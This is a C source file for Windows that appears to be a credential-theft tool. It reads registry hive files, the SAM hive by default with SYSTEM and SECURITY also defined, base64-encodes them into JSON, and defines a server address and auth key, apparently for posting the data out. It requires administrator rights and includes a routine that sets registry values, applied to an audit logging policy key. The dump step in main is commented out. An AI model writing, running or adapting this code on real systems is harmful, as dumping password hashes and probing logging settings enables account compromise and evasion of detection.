#include <stdio.h>
#include <windows.h>
#include "common.h"
#include "post.h"

// Default macros in case we didn't build correctly
#ifndef SVL_ADDRESS
    #define SVL_ADDRESS "https://localhost"
#endif

#ifndef SVL_AUTHKEY
    #define SVL_AUTHKEY "NO AUTH KEY"
#endif

// ⭐ RegExport-Specific Configurations. These are the file paths for the root hive KeyNodes. The comments for regexport.c might use some unfamiliar terminology. 
// Check out this document to see what they mean: https://docs.google.com/document/d/15l3jfCYQE5Fd4Z4w4KaEqe7B-SmOlw8OUAaxSRgTeCo/view

#define HKLM_SYSTEM "C:/Windows/System32/config/system"
#define HKLM_SAM "C:/Windows/Sysnative/config/SAM"
#define HKLM_SECURITY "C:/Windows/System32/config/security"
#define HKLM_SOFTWARE "C:/Windows/System32/config/software"
#define HKU_UserProfile "C:/profiles/usere"
#define HKUD "C:/Windows/System32/config/default"

/**
 * ⭐ Array of Registry files to export. Use absolute pathing or one of the typedefs.
 * ⭐ You are responsible for setting the array size
 */
#define REG_EXPORTS_SIZE 1
char* REG_EXPORTS[REG_EXPORTS_SIZE] = {HKLM_SAM};

/**
 * Read all the files given in $file_names, and outputs their content in JSON
 * @param file_names An array of file names to read
 * @param size The size of the file_names array
 * @param json_length {Outbound} Pointer that will output length of the JSON string
 * @note By calling this function, you must deallocate json_string
 * @return JSON string
*/
char* spill_file_json(char** file_names, int size, int* json_length)
{
    // Create our JSON string. Let's add a size object to determine the number of items in it.
    int json_size = 1;          // Start with 1 to take into account null terminator
    char* json_string = malloc(json_size);
    strcpy(json_string, "");

    // Add { to beginning of JSON. To do that, we will need to allocate 1 byte.
    json_size++;
    json_string = realloc(json_string, json_size);
    strcat(json_string, "{");

    // First, let's iterate through the files.
    for (int i = 0; i < size; i++)
    {
        FILE* read_file = fopen(file_names[i], "rb");
        if (read_file == NULL)
        {
            perror("Error");
        }

        concat_mem(&json_string, json_size - 1, "\"", 2, &json_size);
        concat_str_mem(&json_string, json_size - 1, file_names[i], strlen(file_names[i]) + 1, &json_size);
        concat_mem(&json_string, json_size - 1, "\":", 3, &json_size);

        // Read the file, and put the needed items into the JSON string. Basically, we want "{File Content}",

        // Remember, we are still dynamically allocating this. Hence, we will need the file size (read: number of chars in file)
        // First, let's get the original file text
        long file_contents_size = get_file_size(read_file);

        char* file_contents = malloc(file_contents_size + 1);       // We will transfer this over via strcat
        fread(file_contents, file_contents_size, 1, read_file);
        file_contents[file_contents_size] = '\0';                   // C doesn't automatically add null terminators to the end of fread, so we should do it manually ourselves

        fclose(read_file);

        // Transferring binary data over JSON is a bit of a pain. Hence, we will encode it in base64
        // The base64 function requires us to preallocate the base64 string size
        int b64_size = base64_size(file_contents_size);
        char* base64_str = malloc(b64_size + 1);            // Add 1 byte for \0
        base64(file_contents, file_contents_size, base64_str);
        base64_str[b64_size] = '\0';

        // Actually write the string here
        concat_mem(&json_string, json_size - 1, "\"", 2, &json_size);
        concat_str_mem(&json_string, json_size - 1, base64_str, b64_size + 1, &json_size);   // Base64 size does not take into account \0, so we add 1
        concat_mem(&json_string, json_size - 1, "\",", 3, &json_size);

        // Garbage collector
        free(file_contents);
        free(base64_str);
    }

    // Close the JSON at the end - and overwrite the last comma with }. The null byte can stay intact - no need to copy that over.
    concat_mem(&json_string, (json_size - 1) - 1, "}", 1, &json_size);
    *json_length = json_size;
    return json_string;
}

/**
 * Validates all the files in REG_EXPORTS
 * @returns 1 if all the files exist, 0 otherwise
 */
int validate_files()
{
    int all_valid = 1;

    for (int i = 0; i < REG_EXPORTS_SIZE; i++)
    {
        if (!is_valid_file(REG_EXPORTS[i]))
        {
            fprintf(stderr, "Error: %s is not a valid registry file. Please check the contents of REG_EXPORTS.\n", REG_EXPORTS[i]);
            all_valid = 0;
        }
    }

    return all_valid;
}

/**
 * Modifies the contents of an existing registry KeyValue.
 * 🚨🚨🚨 `BE VERY CAREFUL WHILE USING THIS!!! YOU ARE MODIFYING THE REGISTRY!!! THIS WILL BLOW UP YOUR PC IF DONE WRONG!!!` 🚨🚨🚨
 * @param root_key Root Key (such as HKEY_LOCAL_MACHINE).
 * @param path Registry path of the Subkey of the KeyNode to edit. This branches off from the `root_key`.
 * @param key KeyValue to edit.
 * @param value The value to edit
 * @returns 1 on success, 0 on fail
 */
int modify_keyvalue(HKEY root_key, char* path, char* key, int value)
{
    // Open the reg key
    HKEY subkey;
    long status = RegOpenKeyEx(root_key, path, 0, KEY_SET_VALUE | KEY_READ, &subkey);
    if (status != ERROR_SUCCESS)
    {
        fprintf(stderr, "Error when opening %s: Got error code %d. The registry subkey or keyvalue very likely does not exist.\n", path, status);
        return 0;
    }

    long result = RegSetValueEx(subkey, key, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
    if (result != ERROR_SUCCESS) 
    {
        fprintf(stderr, "Error setting KeyValue for %s. Got error code %d.\n", key, result);
        RegCloseKey(subkey);
        return 0;
    }

    printf("KeyValue %s successfully set to %d.", key, value);
    RegCloseKey(subkey);

    return 1;
}

int main() {
    int admin_perms = is_admin();
    if (admin_perms == 0) 
    {
        fprintf(stderr, "Error: This script must be run with administrator perms.\n");
        return 1;
    }
    else if (admin_perms == -1)
    {
        return 1;
    }

    if (validate_files() == 0)
    {
        return 1;
    }

    // 🗒️ Remember that Registry paths use \\ instead of /
    if (modify_keyvalue(HKEY_LOCAL_MACHINE, "random\\doesnotexist", "whatisthis", 1) == 0)
    {
        fprintf(stderr, "HKEY_LOCAL_MACHINE:\\random\\doesnotexist\\whatisthis can't be modified. This isn't necessarily a bad thing - that means there's no logging in place.\n");
    }

    if (modify_keyvalue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit", "EnableScriptBlockLogging", 1) == 0)
    {
        fprintf(stderr, "HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\\EnableScriptBlockLogging can't be modified. This isn't necessarily a bad thing - that means there's no logging in place.\n");
    }
    
    // int json_length;
    // char* json_str = spill_file_json(REG_EXPORTS, REG_EXPORTS_SIZE, &json_length);
    
    // print_mem(json_str, json_length, TRUE);

    // // Cleanup + Re-enable file system redirection
    // free(json_str);
    // //Wow64RevertWow64FsRedirection(redirect_val);
    
    return 0;
}